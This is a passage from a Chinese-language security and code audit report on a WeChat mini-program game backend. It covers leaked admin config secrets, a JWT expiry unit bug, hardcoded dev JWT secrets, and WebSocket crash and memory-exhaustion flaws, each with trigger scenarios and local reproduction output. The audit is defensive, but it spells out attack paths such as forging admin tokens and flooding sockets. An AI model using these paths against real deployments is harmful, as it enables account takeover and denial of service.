- **布局硬规则逐页核对通过**：11 个页面全部是 `global-bg-image → app-header（padding-top: {{nav.statusBarHeight}} / padding-right: {{nav.capsuleSpace}}）→ page-content`；每个页面 `onLoad` 都写入 `data.nav = getNavLayout()`（boot 页豁免但同样写了）。`pages/legal/privacy`、`pages/legal/agreement`、`pages/tasks` 三个后加页面同样合规。
- **`__resetForTests()` 未被生产代码调用**：`pages/**`、`utils/**`（除导出）、`app.js` 中均无调用；仅 `tests/**` 使用。
- **隐私门禁前置**：未取得同意前不会发起业务请求 —— `app.js` 启动即 `reLaunch` 到 boot；`utils/api-client.js:146` 在每次非公开请求前 `privacy.assertAllowed()`；`/configs/public` 是唯一豁免路径且只在同意之后调用；开发预览下 `tryAutoLogin` 直接返回。各页面 `onLoad/onShow` 在 `canEnter()` 为 false 时立即返回。
- **游客/账号资产隔离**：`utils/shop-store.js` 对登录态使用独立的服务器快照（`accountState` + token/revision 校验），登录后所有本地写入被 `rejectLocalAccountMutation()` 拒绝；登出后游客本地存档恢复可见。
- **本地/联机分支隔离**：对局页按 `sessionId` 二选一分支，联网房间下房间页 `unsubscribeStore()` 停止本地 store 覆盖（`pages/room/index.js:331,356`）；房间页/首页底部导航对本地状态都有 `finished/playing` 前置判断 —— **唯独结算页漏判**（见 I-1）。
- **分享与邀请参数闭环**：房间分享携带 `roomId + backendRoomId + scene=room`（`pages/room/index.js:444-461`），首页 `onLoad` 识别 `scene==='room'` 并转交房间页（`pages/home/index.js:66-74`），隐私门禁通过 `privacy.destination/restoreDestination` 只放行 home/room 两条路由且保留编码后的 query。
- **api-client 的 401/续期/并发/超时**：`utils/api-client.js` 的并发只触发一次登录、续期后重试、GET 退避重试、4xx 不重试、上传 15s 超时等均有专门用例（`tests/api-client.test.js` 共 21 项），未发现逻辑错误。
- **游戏引擎规则层**（`utils/game-engine.js`）：队伍锁定、人数补齐、排名构建等纯函数逻辑与测试一致。

### I-15 · 这一路的「存疑，未能确证」

1. **前后台切换时对局与音频的完整恢复**：需真机。代码上 `app.onHide` 会 `pauseGame()`+`stopBgm()`，`arena.onShow` 会 `resumeGame()`，但真机上前台恢复是否真的续播/续计需要设备验证。
2. **CDN 资源可达性**：全部资源走 `https://xcx.ukb88.com/`，按只读要求未发起远程请求，无法确认 404/超时比例；I-4 的触发概率取决于实际可用性。
3. **`legal-config.js` 未配置（`configured:false`）时的完整链路**：当前工作区是 `configured:true`。按代码推演：`isReady()` 为 false → `privacy.canEnter()` 为 false → `app.onLaunch` reLaunch 到 boot → boot 显示「暂未开放使用」，同意按钮不渲染，生产环境无法进入。**未实际运行验证**。
4. **主包体积**：1.92MB 是按磁盘字节估算，未用微信开发者工具的「上传包体积」实测。
5. **`utils/run-arena.js` / `run-arena-renderer.js` / `arena-effects.js`** 为 minigame TS 生成物，未细审内部逻辑。

---

## J. 代码级深审 · 后端 HTTP 层 / 鉴权 / 安全 / 管理端 API

> 由独立审计代理完成。验证方式：逐路由读码 + 只读复现脚本（`/tmp/jinli-audit-http/`，mock 掉 `models/db`，不连库、不监听端口、不访问外网）；`cd back && npm test` 173/173 通过。

### J-1 · [P0] 微信 AppSecret / AI API Key 以**未脱敏的 `config_value`** 泄露给普通（normal）管理员

- 位置：`back/src/utils/admin-presenters.js:68-83`（`mapConfig` 用 `...row` 展开整行）、`back/src/middleware/require-role.js:43-46`（脱敏只替换 `value`）、`back/src/routes/admin/configs.js:16-24`（`GET /configs` 返回整个数组）、`back/src/services/admin-config-service.js:108-115`（`getAllConfigs` = `SELECT * FROM system_configs`）
- 问题：`mapConfig(row, definition)` 返回 `{ ...row, key, value, ... }`，`row` 来自 `SELECT *`，因此响应里**同时存在** `value`（= `row.config_value`）**和原始列 `config_value`**。`maskSensitiveConfigForNormal` 的数组分支只做 `{...item, value: SENSITIVE_MASK}`，**不会碰 `config_value`**。脱敏形同虚设。
- 触发场景：以 `role = normal` 的管理员登录后台 → `GET /api/admin/configs` → 200，响应中 `wechat.login_secret` 与 `ai.api_key` 的 `config_value` 是**明文**（`value` 显示 `******`，`config_value` 显示真值）。拿到微信 AppSecret 即可用 `jscode2session` 换取任意用户 openid、**伪造任意账号登录态（接管所有用户账号）**，并可调用微信其它开放接口；AI API Key 直接外流产生资损。
- 验证（真实 admin 路由 + 真实 adminAuth/JWT）：
  ```
  normal 角色 → status200，data[0].value = "******"，
               data[0].config_value = "SUPER_SECRET_APPSECRET_VALUE"
               data[1].config_value = "sk-LEAKED-API-KEY"
               >>> LEAK PRESENT: true
  super 角色（对照）→ value = SUPER_SECRET_APPSECRET_VALUE（正常）
  对照：GET /api/admin/configs/wechat.login_secret（单键）确实被脱敏为 ******
        GET /api/configs/public 只含 18 个 isPublic 键，无敏感项
  ```
- 补充：`back/admin-web/src/views/configs/SystemConfig.vue` 全程只读 `value`、不读 `config_value` —— 说明前端信任服务端脱敏，**泄漏纯在 API 响应里**（DevTools / curl / 任意脚本都能取）。
- 修复方向：`mapConfig` 不要 `...row` 全量展开，显式挑字段；或把脱敏改为对 `config_value` 与 `value` 两个键同时生效。最省事的是**只返回 `value`**。
- 置信度：高。

### J-2 · [P1] 用户端 JWT 有效期被缩短 1000 倍（`expiresIn` 数值字符串被 `ms()` 当成毫秒）

- 位置：`back/src/services/admin-config-service.js:264`（`tokenTtl: String(tokenTtlValue || …)`）、`back/src/services/auth-service.js:141`（`generateToken(user, wxConfig.tokenTtl || config.jwt.expiresIn)`）、`:81-87`（`jwt.sign(..., { expiresIn })`）、默认值 `back/src/config/system-config-definitions.js:173-178` 与 `back/sql/003_admin_features.sql:89`（均为 `'604800'`）
- 问题：`wechat.login_token_ttl` 存的是「秒」的纯数字串。`jsonwebtoken@9` 的 `timespan()` 对字符串走 `ms()`，而 `ms('604800')` 返回 **604800 毫秒**（`ms` 对无单位数字串默认按 ms），于是 `exp = iat + 604`。管理端用的是 `config.jwt.expiresIn`（`'7d'`），单位正确 —— **只有用户端错**。
- 触发场景：
  - 默认配置（`604800`）→ 用户 token 实际只活 **604 秒（10 分钟）**，而非 7 天。客户端虽有 401 自动续期，但代价是**每 ~10 分钟一次额外的 `wx.login()` + `jscode2session` 往返**；微信接口抖动/限流时用户直接掉线。
  - 后台把 TTL 调成 3600 秒（「1 小时」，`SystemConfig.vue:319` 就是按秒填写的）→ token 只活 **3.6 秒** → 每次请求都触发续期风暴，接口基本不可用。
- 验证（真实 `getWechatLoginSettings()` + 真实 `generateToken()`）：
  ```
  getWechatLoginSettings().tokenTtl = "604800" (string)
  用户 token 实际有效期 = 604 秒    (期望 604800 秒 = 7 天)
  TTL 设为 3600 秒时，用户 token 实际有效期 = 3 秒
  管理端 token 实际有效期 = 604800 秒  (对照，expiresIn = '7d')
  ```
  另直接验证：`ms("604800") = 604800`（毫秒），`ms("7d") = 604800000`。
- **为什么没被测出来**：`back/tests/auth-recovery.test.js:34` 把 `getWechatLoginSettings` mock 成 `{tokenTtl: '7d'}`，**绕过了真实取值路径**。
- 置信度：高。

### J-3 · [P1] 生产环境 `public` 渠道后端无法启动，且无任何开关可解除

> **与 A2 是同一个问题的两个视角**：A2 从配置契约角度描述，J-3 从运行时行为角度确证。

- 位置：`back/src/app.js:11-13`、`back/src/services/release-readiness.js:17-21,28-35,39-45`、`back/src/config/index.js:70`
- `app.js` 的注释写「生产运行与公开发行分别检查」，但实现上 `assertBackendDeploymentReady({channel:'public'})` 直接转调 `assertPublicReleaseReady()`，而 `getReleaseBlockers()` 在 `audience==='public'` 时**无条件**追加三条硬编码 blocker（服务类目 / 实名防沉迷 / 发行资质）。这些 blocker 不是配置项，**没有任何环境变量或数据库状态能让它变成空**。
- 验证（直接调用真实模块）：
  ```
  assertBackendDeploymentReady({channel:'public'}) THROWS
    code=PUBLIC_RELEASE_BLOCKED
    正式公开发布被阻止：- 服务类目… - 实名防沉迷… - 发行资质…
  trial: NO THROW
  ```
- 推论：现网很可能是 `trial` 模式在跑（`TRIAL_USER_IDS` 白名单限制），**公开渠道是一条死路** —— 即使将来拿到全部资质，`public` 分支也仍然会因这三条硬编码 blocker 而拒绝启动。
- 置信度：代码行为 高；「现网是否已踩到」低（生产 `.env` 不可见）。

### J-4 · [P2] 生产环境 `/api/rooms/*` 把内部错误原文回传给客户端

- 位置：`back/src/routes/rooms.js:26,95,108,126,144,181`（`res.status(err.statusCode || 500).json(fail(err.message))`）、`back/src/utils/response.js:29-35`
- 问题：`fail(message)` 单参调用 → `code` 取默认 **400** → `fail()` 里的生产脱敏条件是 `safeCode >= 500`，不成立 → **原始错误文本不脱敏**。同时 HTTP 状态是 500 而 body 里 `code` 是 400，客户端按 body 判定会当成业务错误（不重试）。
- 触发场景：生产中任一 room 操作触发 DB 异常（如 `ER_DUP_ENTRY`、连接被拒）→ 客户端直接收到 `"ER_DUP_ENTRY: Duplicate entry 'room-1' for key 'uk_room_code'"`，泄漏表名/索引名/内部结构。
- 验证（`NODE_ENV=production`）：
  ```
  HTTP status = 500
  response body = {"code":400,"message":"ER_DUP_ENTRY: Duplicate entry 'room-1' for key 'uk_room_code'","data":null}
  fail("DB 内部错误", 默认) = {"code":400,"message":"DB 内部错误"}     ← 未脱敏
  fail("DB 内部错误", 500)  = {"code":500,"message":"服务开小差了…"}  ← 正确对照
  ```
- 其余路由（`games.js`/`auth.js`/`user.js`）都传了 code，不受影响。
- 置信度：高。

### J-5 · [P2] `NODE_ENV` 未做取值白名单，非 `production` 的任意拼写会静默关闭全部生产加固

- 位置：`back/src/config/index.js:12`（`const nodeEnv = process.env.NODE_ENV || 'development'`，无白名单）、`:19-22,42-62,66-68,86-100,107-113`
- 所有生产分支都用严格等值 `nodeEnv === 'production'`。`NODE_ENV=prod`（常见笔误）、`NODE_ENV=Production`、`NODE_ENV=` 空串一律被判为「非生产」，于是同时发生：
  1. `requireStrongSecret` 回落到**硬编码的 `dev-jwt-secret` / `dev-admin-jwt-secret`**（`config/index.js:64-65`）—— **这两个值就写在仓库源码里**，攻击者可用它们自行签发 `{adminId:1}` 的管理员 token；
  2. `parseCorsOrigin` 返回 `'*'`；
  3. 5xx 不脱敏；
  4. 不做发布就绪校验；
  5. `db.password` 回落 `'game_codex_pass'`。
- 触发场景：新机器/轮换密钥时把 `NODE_ENV` 写成 `prod`，或 `.env` 漏配 `JWT_SECRET` 且 `NODE_ENV` 非精确 `production` → 服务用公开已知的 dev 密钥签发 token，任何人可伪造超级管理员，或伪造任意用户 token。
- 验证：读码确认 `nodeEnv` 无白名单；`back/tests/security-hardening.test.js` 只覆盖了精确 `'production'`，未覆盖 `'prod'`。
- 置信度：高（代码行为）；触发依赖运维配置，故不判 P0。

### J-6 · [P2] 微信 `jscode2session` 调用没有超时、没有响应体积上限

- 位置：`back/src/services/auth-service.js:15-45`
- `https.get(url, cb).on('error', reject)` —— 没有 `setTimeout`/`req.destroy()`，也没有长度上限（`data += chunk` 无界累积）。对比同仓的 `content-safety-service.js:39` 是有 8s 超时的，说明这是遗漏。
- 触发场景：`POST /api/auth/login` 与 `POST /api/auth/refresh` 未做限速（`routes/auth.js` 无任何限流中间件）。上游 `api.weixin.qq.com` 抖动/被中间设备挂起时，Promise 永不 settle，请求挂到 Node 默认 `server.requestTimeout`（300s）；并发若干次即可耗尽连接、放大到微信接口 QPS 被封（进而**全量用户登录失败**）。
- 置信度：高。

### J-7 · [P2] 未配置 `TRUST_PROXY` 时，管理端登录限速退化成「全站共享一个 IP 桶」→ 5 次失败即可锁死全部管理员

- 位置：`back/src/middleware/rate-limiter.js:86-113`（`ipKey = req.ip`，失败时同时 `recordFailure(ipKey)` 与 `recordFailure(userKey)`）、`back/src/app.js:26-29`、`back/src/config/trust-proxy.js:18-33`
- 默认 `trust proxy = false`。部署在 nginx 之后时 `req.ip` 恒为代理 IP，所有管理员共用同一个 `ipKey` 桶。`app.js:27-29` 只在生产打一条 `console.warn`，**不阻断**。
- 触发场景：任意来源连续 5 次错误口令 → `ipKey` 被锁 30 分钟 → **所有管理员（包括超管）在这 30 分钟内一律 429**，运营方无法登录后台处理。管理员自己连续输错 5 次密码也会触发同样效果（自己把自己锁 30 分钟）。
- 置信度：代码行为 高；「生产未设置 TRUST_PROXY」这一前提 中。

### J-8 · [P3] 其它

- **J-8a 管理端登录/登出完全不写操作日志**：`back/src/routes/admin/auth.js:24-82`。`routes/admin/` 下 28 处 `logOperation` 覆盖了 admins/announcements/items/configs/fortune/users/rooms，**唯独登录没有**。`operation-logger.js:50` 的注释明确把 `login` 列为预期动作类型。后台账号被盗用时审计日志里查不到任何登录痕迹；只有 `admins.last_login_at` 被更新过一次，且无法区分失败尝试。
- **J-8b 注销账号未清理 `daily_tasks` 残留数据**：`back/src/services/user-service.js:137-253`（事务内删了 `user_items`、`coin_records`、`room_players`、`avatar_reviews`，**没有 `daily_tasks`**）。与「注销即清理个人资料」的隐私承诺不一致（`coin_records` 是被删了的）。
- **J-8c 管理员创建/改密没有口令强度策略，`role` 没有取值白名单**：`back/src/services/admin-admin-service.js:33-50,52-90,97-101`。① 只校验「非空」，超管可把口令设成 `1`；② `role` 不校验，而 `back/scripts/create-admin.js:40` 却校验了 `['super','normal']` —— 两条路径不一致，后台 API 建号时 `role` 写成 `'Super'`/`'super '` 会静默建成「无任何后台权限」的账号（`requireRole('super')` 是严格等值比较）；③ 没有「最后一个超管」保护，超管可把自己降级，导致后台永久锁死。
- **J-8d 生产环境未强制 `DB_PASSWORD`，缺失时静默使用内置弱默认**：`back/src/config/index.js:107-113`（`password: process.env.DB_PASSWORD || 'game_codex_pass'`）。`ADMIN_PASSWORD` 走了 `requireProductionEnv`（生产缺失即抛错），`JWT_SECRET` 走了 `requireStrongSecret`，但 `DB_PASSWORD`/`DB_USER`/`DB_HOST` 全是 `||` 兜底，且 `'game_codex_pass'` 是公开的源码常量。
- **J-8e `normal` 角色管理员可以强制关闭进行中的房间并触发结算/回滚**：`back/src/routes/admin/rooms.js:39-56`（`PUT /:id/close` 只有 `adminAuth`，无 `requireRole`），内部会 `gameService.forceFinishSession(..., {settle:true})` 终止正在计时的对局并结算奖励。该动作的破坏力与「读列表」完全不同。（`routes/admin/index.js:12` 注释说明 `rooms` 归 normal 可访问，属既定设计，故只作提示。）

### J-9 · 这一路的「存疑，未能确证」

1. **封禁/停用后旧 token 的失效窗口**：用户封禁 15s、管理员停用或降权 30s 内旧 token 仍可用。代码注释已声明为有意取舍，且 `deleteAccount` 主动清了用户缓存，故**不作为缺陷上报**；但管理员封禁用户时没有同步清 `userStateCache`，若产品要求「封禁即刻生效」则需补。
2. **`GET /api/admin/users` 等列表接口返回 `SELECT *` 整行**（含 `openid`），`mapUser` 用 `...row` 全量透出，normal 管理员可见所有用户 openid。是否属于「运营必需」无法从工作区判断，故未列为缺陷。
3. **`POST /api/user/avatar` 的 multipart 字段数量无上限**（multer 只限了 `fileSize: 2MB` 与 `files: 1`，`parts`/`fields` 默认无限），理论上可被已登录用户用大量小字段撑内存。缺真实压测证据。
4. **`config_value` 泄漏的实际影响面**：只能确认 API 层泄漏；生产 `system_configs` 里 `wechat.login_secret`/`ai.api_key` 是否真的填了真值取决于线上数据，工作区无法核实。若为空值，严重性下降。

### J-10 · 这一路**已检查且未发现问题**的范围（重要）

- **用户端路由鉴权挂载**：`/api/user/*`、`/api/rooms/*`、`/api/games/*`、`/api/shop/*`、`/api/stats/*`、`/api/tasks/*`、`/api/leaderboard` 全部挂了 `authMiddleware`；`/api/health`、`/api/ready`、`/api/configs/public`、`/api/announcements` 为公开端点且分别只暴露健康状态、仅 `isPublic` 配置、仅 `status='published'` 公告（已实测公开配置不含敏感键）。
- **管理端 RBAC 接线**：实测 normal 访问 `PUT /users/:id/coins`、`PUT /configs`、`PUT /configs/:key`、`POST/PUT/DELETE /admins` 全部 403；super 放行；未登录 401。守卫确实生效（`routes/admin/index.js:16,20-22,48`）。
- **SQL 注入面**：本范围内所有动态 SQL 均为占位符或白名单常量。动态 `ORDER BY` 只在 `stats-service.js:118-133`（switch 白名单）与 `admin-*-service`（固定串）；`LIMIT ?/OFFSET ?` 全部参数化；`IN (${placeholders})` 的 placeholders 均由代码内固定键列表生成；`admin-log-service.js` 的过滤条件全部 `?` 绑定；`fortune-reality-service.js:447,462` 的 `limit` 有 `Number()` + clamp。**未见注入点。**
- **微信内容安全回调**：验签用 `sha1(token,timestamp,nonce[,encrypted].sort().join(''))` + `timingSafeEqual`（含长度前置比较）；解密为 AES-256-CBC、IV 取 key 前 16 字节、手工 PKCS#7 去填充；**回放**由 `Math.abs(now/1000 - timestamp) > 300` 拦截；`plain` 里校验了 `appId`；`applyEvent` 对非 pending 行幂等，重放不会二次发布；`GET` 挑战接口也需有效签名。
- **头像上传**：multer 2.5.0 + `memoryStorage` + `fileSize 2MB` + `files:1`；`avatar-review-service.js:11-26` 先按 magic bytes 判 jpg/png 再经 sharp 重编码为 PNG（剥离 EXIF/附加块），**发布的就是被审核的同一份字节**；文件名 `${userId}_${16字节随机hex}.png` + `flag:'wx'` 独占创建；`back/private/` **未被静态挂载**（`app.js` 只挂了 `/uploads`），审核文件只能通过一次性随机 token（64 hex，且限 `status='pending' AND expires_at>NOW()`）下载；`mediaPath` 用 `path.basename` 防穿越。
- **JWT**：jsonwebtoken 9.0.3 对字符串密钥默认只允许 HS256/384/512，`alg=none` 已被拒（`verify.js:132-144`）；用户端与管理端密钥在生产强制不同（`config/index.js:66-68`）；封禁/注销后旧 token 经 `assertActiveUser` 拦截。
- **账号注销主流程**：`user-service.js:137-269` 使用 `READ COMMITTED` + 按 id 升序锁账号/房间、成员变更二次校验、进行中对局返回 409、结果 JSON 匿名化、文件删除失败回滚并用备份还原、`AggregateError` 上抛回滚失败。事务与锁顺序未见明显缺陷。
- **CORS / helmet / 请求体大小**：`cors({origin: config.cors.origin})` 生产默认 `false`（不发 CORS 头），未用通配；helmet 7 默认启用；`express.json()` 默认 100kb、`urlencoded` 默认 100kb、头像 2MB。
- **启动 / 退出**：`app.js` 有 SIGTERM/SIGINT 优雅退出（停表 → 关 io/ws → `server.close` → `db.pool.end()`，10s 强制退出兜底）；`db.pool` `connectionLimit:10 / waitForConnections:true`；mysql2 的 `charset:'utf8mb4'` 能正确解析为字符集编号 45；生产强密钥校验、发布就绪校验均已接线。

---

## K. 代码级深审 · 实时对局通道（服务端 socket ↔ 小程序 ↔ 小游戏）

> 由独立审计代理完成。复现脚本在 `/tmp/jinli-audit-realtime/`。**主代理已独立复核 K-1 的崩溃链路与 Node 行为。**

### K-0 · 先厘清「哪套通道真正在跑」（避免误报）

- **线上唯一通道**：`back/src/app.js:73` 挂载 `createArenaRealtimeHub(server)`（原生 `ws`，路径 `/ws/arena`）。
- **两个客户端都走这条**：`pages/arena/index.js:195` 与 `minigame/src/core/OnlineGame.ts:238` 都是 `wx.connectSocket({url:'<origin>/ws/arena?sessionId=N', protocols:['arena.<jwt>']})`。
- **Socket.IO（`back/src/socket/arena-handler.js`）已挂载但无任何客户端**（全仓库无 `socket.io-client` 依赖）。
- **`back/src/socket/native-arena-ws.js` 已不再挂载**（`app.js` 里没有任何引用；只有 `back/tests/audit-regressions.test.js:134` 在测它）→ 属于死代码，**旧的 `/ws/arena` 入口并未暴露**。
- **`utils/arena-realtime.js` 是死代码**（全仓库只有 `tests/arena-realtime.test.js`、`back/tests/arena-realtime-security.test.js` 引用它，没有任何 `pages/` 引用）。
- Token 走 `Sec-WebSocket-Protocol: arena.<jwt>`，URL 里只有 `sessionId`；`morgan` 只记录 HTTP 请求，upgrade 请求不进 morgan 日志。

### K-1 · [P1，接近 P0] `getGameState` 在 ws 连接回调里抛错 → 未处理 rejection → **整个后端进程退出，所有进行中对局作废**

- 位置：`back/src/socket/arena-realtime.js:153`（崩溃点）、`:186`（同源第二处）、`back/src/services/game-service.js:736` → `back/src/services/game-actions-service.js:41` → `:12`
- **两处「成员」来源不同**：连接鉴权用的是 **DB 表 `game_players`**（`arena-realtime.js:130` `isSessionMember`），而 `gameService.getGameState()` 内部又调用 `gameActions.getView()` → `requirePlayer()`，后者校验的是**内存里的 `game.players`**（`game-actions-service.js:11`）。一旦不一致，`getGameState` 抛 `Error('对局不存在')`（statusCode 404）。
- `wss.on('connection', async (ws, req) => {...})` 是 **async EventEmitter 监听器**，`arena-realtime.js:153` 抛出的异常**没有任何 try/catch** → 变成 **unhandledRejection**。`back/src/` 里**没有任何 `process.on('unhandledRejection'/'uncaughtException')`**（主代理实测确认：全 `back/src` 零命中），Node 默认策略（`--unhandled-rejections=throw`，Node ≥15）会把它升级成 uncaughtException → **进程 exit(1)**。
- 同时，`ws.on('close'/'error'/'message')` 三个监听器都注册在 **153 行之后**，所以异常发生后：① 该 ws 永久留在 `sessionClients` 里（`removeClient` 永不执行）；② `watchAccount` 的 15 秒 interval 永不 `clearInterval`。
- **触发场景**：`back/src/routes/rooms.js:158` 的 `roomService.startGame()` 已提交 `game_players`，随后 `routes/rooms.js:167` 的 `gameService.startGameSession()` **重新读 `room_players`**（`game-service.js:213`）构造内存玩家 —— 两次读之间若有人 `leaveRoom`（`room-service.js:260-338` **不校验房间状态**，`playing` 房间也能退，与 **H-4** 同一个缺陷），该用户就会「有 `game_players` 行、没进 `game.players`」。
- **更要命的是这条路径不需要用户主动去开对局页**：`back/src/routes/games.js:27-34` 的 `GET /api/games/current` 只 join `game_players`，所以这个「幽灵成员」在首页会看到「继续本局」入口（`pages/home/index.js:181-184`），点进去 → `pages/arena/index.js:195` 建立 ws → **服务端当场崩溃**。小游戏端 `OnlineGame.restore()`（持久化了 sessionId）同样会自动重连。
- **崩溃后果**：进程内存里的 `activeGames` 全部丢失 → 重启后 `game-service.js:751` `reconcileOrphanSessions()` 把所有 session 标记为「中断」→ **当前所有玩家的对局被判负、无奖励**。
- 验证：db stub + 真实 `arena-realtime.js` 在本机回环复现，默认策略下进程退出码 1，栈为 `at Object.getGameState (game-service.js:736:36) at WebSocketServer.<anonymous> (arena-realtime.js:153:31)`。主代理独立复核：Node 默认策略实测退出码 1，`back/src` 确实无 `unhandledRejection` 兜底。
- 置信度：**高**（崩溃链路与复现均已确证）；幽灵成员状态的**可达性**为**中高**（竞态窗口存在，但无法连真实 MySQL 跑出该中间态）。

### K-2 · [P1] 同一个抛错会连带打断整个房间的实时广播（不止崩溃那一个连接）

- 位置：`back/src/socket/arena-realtime.js:180-189`（`emitToSession`）、`back/src/services/game-service.js:394-397`（tick 广播）
- `emitToSession` 里 `clients.forEach(ws => {... gameService.getGameState(sessionId, ws.userId) ...})`，**`forEach` 回调抛异常会中断遍历**，后面的客户端一个都收不到帧；异常继续冒泡到 `tick()`，被 `game-service.js:342-344` 的 catch 吞掉后 `scheduleNext()` 继续 → **每 50ms 打一条错误日志，同时该房间所有玩家的实时画面全部停摆**，只能退化到 HTTP 轮询（小程序 500ms 一次、小游戏 1.5s 一次）。
- 置信度：高（机制确定），触发条件依赖 K-1 的中间态。

### K-3 · [P1] ws 服务端未设 `maxPayload`，「512 字节单帧上限」形同虚设；**未鉴权**客户端即可把上百 MiB 压进后端内存

- 位置：`back/src/socket/arena-realtime.js:82`（`new WebSocketServer({ noServer: true })`）、`:169`（`if (raw.length > 512) return;`）
- `ws` 8.22.0 的 `maxPayload` 默认 **104857600（100 MiB）**。512 字节的判断发生在**帧已被完整缓冲之后**，只挡住了应用层解析，没挡住内存占用。而且 `maxPayload` 在 ws 接收器层面生效，**握手一完成就开始缓冲**，早于本项目的鉴权（鉴权要等一次 DB 查询）。
- 触发场景：任何能连到 `/ws/arena` 的客户端，握手后立刻发大帧：
  - 已登录成员：连接保持存活，服务端 RSS +68 MB / external +192 MB（实测）。
  - **未携带 token**：服务端虽会 `close(4001)`，但关闭握手完成前已缓冲 96 MiB（3×32 MiB 实测 external +192 MB）。
  - 10 条并发连接即可打满 1 GB；`maxPayload` 上限 100 MiB/连接且**无连接数限制**。
- 置信度：**高**（三次复现均实测）。

### K-4 · [P1] 非 `/ws/arena` 路径的 Upgrade 请求既不响应也不关闭 → 连接无限期泄漏

- 位置：`back/src/socket/arena-realtime.js:97-101`
  ```js
  server.on('upgrade', (req, socket, head) => {
    const parsed = parseUpgradeRequest(req);
    if (!parsed) { return; }   // ← 直接 return，socket 既没 destroy 也没写响应
  ```
- `parseUpgradeRequest` 对非 `/ws/arena` 路径返回 `null`，此时 `socket` 被「劫持」但既没 `socket.destroy()` 也没回 HTTP 响应。Node 的 `server.requestTimeout`（默认 300000 ms）**不作用于被 `'upgrade'` 监听器接管的 socket**（实测：把 `requestTimeout` 缩到 2000 ms，挂起的 upgrade socket 8 秒后仍未被关闭）。
- 触发场景：任意匿名客户端用 `Connection: Upgrade` 打任意路径（如 `GET /`），即可占住一个 fd 且**不设时限**。并发开满即耗尽文件描述符，后端无法接受新连接。
- 验证：客户端收到 **0 字节**，`socket.destroyed === false`；缩短 `requestTimeout` 后连接依然存活。置信度：**高**。

### K-5 · [P2] 小程序端不处理关闭码 4001，且重连**无退避**（固定 3 秒）→ 封禁/注销/失效 token 后无限重连

- 位置：`pages/arena/index.js:187-190`（`if (!this.socket && Date.now() - (this.lastConnectAt||0) > 3000) this.connectArenaRealtime();`）、`:207`（`const closed = () => {...}`，**完全忽略 `event.code`**）
- 服务端在以下情况统一 `ws.close(4001, ...)`：`arena-realtime.js:122`（缺凭证）、`:138`（非成员）、`:146`（账号封禁/注销）。**小游戏端正确处理了**（`minigame/src/core/OnlineGame.ts:258`：`if (code === 4001) { api.clearToken(); ... }`），**小程序端没有**。
- 触发场景：管理员在玩家对局中封禁/注销该账号 → ws 被 4001 关闭 → 小程序端 3 秒后重连 → 服务端再次 4001 → **无限循环**；每次重连都会打一次 `game_players` 查询。另外重连是**固定 3 秒**、没有指数退避（小游戏端是 1→2→4→8→15s），服务不可用时所有客户端会同步形成重连风暴。
- 置信度：高。

### K-6 · [P3] 其它

- **K-6a 服务端把 `arena.<jwt>` 原样回显在 101 响应的 `Sec-WebSocket-Protocol` 头里**：`arena-realtime.js:14-25` 读取子协议但未设置 `handleProtocols` → `ws` 默认回显客户端提供的第一个子协议。`utils/arena-realtime.js:28-30` 的注释声称「token 不会被记入 server 日志、代理或 referrer」——URL 确实干净了，但**响应头又把完整 JWT 送了出去**。实测抓包：`Sec-WebSocket-Protocol: arena.eyJ1c2VySWQiOjExfQ.SECRET-PART`。任何记录**响应头**的组件（APM/WAF/网关自定义日志、故障抓包）会把长期有效的 JWT 落盘。
- **K-6b 活跃通道没有心跳 / 空闲超时**：`arena-realtime.js:119-176` 全程无 ping/pong、无 idle 超时（两个客户端也都没发）。TCP 半开连接（手机切网/进程被杀）在服务端要等到 OS 的 TCP 超时（可达数小时）才被发现；期间 `sessionClients` 条目、`watchAccount` 定时器（每 15 秒一次 DB 查询）都还在。已死的 `native-arena-ws.js:166-168` 反而实现了 ping/pong，但它没被挂载。期间服务端还持续以 ~10 Hz 向死 socket 推全量 state。
- **K-6c `watchAccount` 把瞬时数据库故障当成「账号已禁用」，会误断所有实时连接**：`account-guard.js:13-26`。`assertActiveUser` → `db.queryOne` 一旦抛错，异常被 catch 吞掉并直接 `revoke()`（关闭 ws）；`arena-realtime.js:129-136` 会把这类 DB 错误报成 `not_arena_member`（4001）——**故障原因被误报成权限问题**，客户端会误以为被踢。
- **K-6d 三套实时实现并存且协议已经分叉**：`arena-handler.js:8` 的 `connectedClients` 只在 `:82/95/136` 写、**全仓库无任何读取**；`arena-handler.js:117-131` 的 `fortune_buy` 只校验 `opportunity` 是对象，**字段完全不校验**就广播给其他玩家；`app.js:74-82` 把原始事件名 `game_frame` 发给 Socket.IO 房间，而 `arena-realtime.js:186` 只给 ws 客户端改名为 `game_state`，死代码 `utils/arena-realtime.js:89-96` 的事件表里**既没有 `game_frame` 也没有 `state_changed`**。
- **K-6e 小游戏端静默丢弃 `arena_error`**：`OnlineGame.ts:242-253` 只处理 `game_state`/`game_tick`/`game_finished`/`state_changed`/`emote_broadcast`，服务端返回的失败原因（「请发送有效的移动方向」「等待所有玩家开始对局」）被吞掉，用户只看到画面不动。`game_aborted`（管理员强制关房）两端都不处理（但同一次关房也会发 `game_finished`，不至于卡死）。
- **K-6f 小程序端自己发表情会在聊天区重复一条**：`pages/arena/index.js:301-306` 本地先播一次，`back/src/routes/games.js:126-132` 的广播**包含发送者** → 收到后再播一次。小游戏端只依赖广播，无此问题。
- **K-6g 同一用户可开任意多个 ws 连接，无连接数 / 频率限制**：`arena-realtime.js:148-150` 的 `sessionClients` 是 `Set<ws>`，只按连接去重、不按用户。每条连接额外挂一个 15 秒 `watchAccount` 定时器，且每次广播都要为它单独 `getGameState()` 重建一次全量状态。`run_input` 入站消息也没有速率限制。

### K-7 · 这一路的「存疑，未能确证」

1. 生产 nginx / 网关是否记录响应头 —— 决定 K-6a 的实际严重级别。
2. 微信 `wx.connectSocket` 对服务端回显 `Sec-WebSocket-Protocol` 的兼容性（按 RFC 6455 合法，但真机行为无法本地验证；仓库测试用的是 Node `ws` 客户端）。
3. K-1 中「`startGame` 提交 → `startGameSession` 重读 `room_players` 之间发生 `leaveRoom`」的真实发生率 —— 本机无 MySQL，只能证明「一旦出现该中间态，服务端必崩」。
4. 服务重启且 `reconcileOrphanSessions()` 因 DB 不可用而失败时，客户端会永久卡在「对局状态恢复中/网络中断」。
5. 真实带宽/CPU 成本：4 人局实测单份 `game_state` 约 1.4 KB、广播 10 Hz、每客户端单独构造一次状态；生产 10 人房约 140 KB/s/房。

### K-8 · 这一路**已检查且未发现问题的范围**（重要）

- **Token 不再出现在 ws URL**：两个客户端都走 `Sec-WebSocket-Protocol`，`morgan` 不记录 upgrade 请求，URL 里只有 `sessionId`。
